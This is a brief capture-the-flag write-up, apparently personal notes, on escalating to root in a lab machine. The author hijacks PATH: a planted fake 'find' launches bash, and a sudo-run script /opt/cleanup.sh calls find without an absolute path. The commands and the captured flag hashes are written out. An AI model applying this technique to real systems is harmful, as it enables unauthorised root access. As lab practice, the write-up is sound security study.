we are in as the user **wizard**
#userflag 7f9da8485ffe27e050498cd4ceee60e9
![[Pasted image 20221111180004.png]]
running sudo -l 
![[Pasted image 20221111191308.png]]

![[Pasted image 20221111191719.png]]
find command has no absolute path and we can leverage that to gain root access 
copying bash to a file called find 
echo /bin/bash > find 
![[Pasted image 20221111191854.png]]
now all we need to do is change the PATH to our current directory and run the script as root
 sudo PATH=$PWD: $PATH /opt/cleanup.sh 
![[Pasted image 20221111192104.png]]
#rootflag 1e6603cb1b3475e00ba97b5d3b684c6b